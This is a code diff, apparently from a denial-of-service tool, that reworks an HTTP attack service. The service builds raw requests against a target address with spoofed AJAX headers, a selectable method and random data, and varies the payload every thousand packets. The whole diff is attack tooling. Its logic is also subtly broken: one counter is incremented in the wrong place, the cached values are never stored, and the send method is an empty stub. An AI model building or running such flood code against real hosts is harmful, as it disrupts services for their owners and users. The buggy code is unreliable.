@@ -3,17 +3,23 @@ from typing import Optional
 from constants import CRLF
 from shared.attacks import AttackRequest
 from shared.attacks.core import BaseService
-from shared.attacks.http import HttpAddress
+from shared.attacks.http import HttpAddress, HTTPMethods
 from shared.randoms import Random
 
 
 class HttpService(BaseService):
     def __init__(self, attack_request: AttackRequest) -> None:
+        super().__init__()
         self._attack_request = attack_request
-        self.__unique_payload_counter = 0
-        self.__cached_payload: Optional[bytes] = None
+        self.__duplicates_headers_counter = 0
+        self.__duplicates_random_data_counter = 0
+        self.__cached_headers: Optional[bytes] = None
+        self.__cached_random_data: Optional[bytes] = None
 
-    def get_headers(self) -> str:
+    def send(self) -> None:
+        pass
+
+    def __get_headers(self) -> str:
         return CRLF.join(
             (
                 r"X-Requested-With: XMLHttpRequest",
@@ -25,16 +31,16 @@ class HttpService(BaseService):
             )
         )
 
-    def _get_http_payload(self) -> bytes:
+    def _get_random_headers(self, http_method: HTTPMethods) -> bytes:
         if not isinstance(self._attack_request.address, HttpAddress):
             raise Exception("You can use only HttpAddress with this attack")
 
         address: HttpAddress = self._attack_request.address
-        headers: str = self.get_headers()
+        headers: str = self.__get_headers()
 
         data = CRLF.join(
             (
-                rf"GET {address.path} HTTP/1.1",
+                rf"{http_method.value} {address.path} HTTP/1.1",
                 rf"Host: {address.target.ip}",
                 headers,
                 rf"Connection: Close{CRLF}{CRLF}",
@@ -43,12 +49,23 @@ class HttpService(BaseService):
 
         return data.encode()
 
+    def _get_http_headers(self, method: HTTPMethods = HTTPMethods.GET) -> bytes:
+        if self.__duplicates_headers_counter % 1_000 == 0:
+            self.__cached_headers = None
+
+        self.__duplicates_headers_counter += 1
+
+        return self.__cached_headers or self._get_random_headers(method)
+
     @property
-    def http_payload(self) -> bytes:
+    def _random_data(self) -> bytes:
+        if self.__duplicates_random_data_counter % 1_000 == 0:
+            self.__cached_random_data = None
+
+        self.__duplicates_headers_counter += 1
+
+        return self.__cached_random_data or Random.get_bytes()
+
+    def http_payload(self, method: HTTPMethods = HTTPMethods.GET) -> bytes:
         """Change HTTP payload every 1000 packets"""
-        if self.__unique_payload_counter % 1_000 == 0:
-            self.__cached_payload = None
-
-        self.__unique_payload_counter += 1
-
-        return self.__cached_payload or self._get_http_payload()
+        return self._get_http_headers(method) + self._random_data
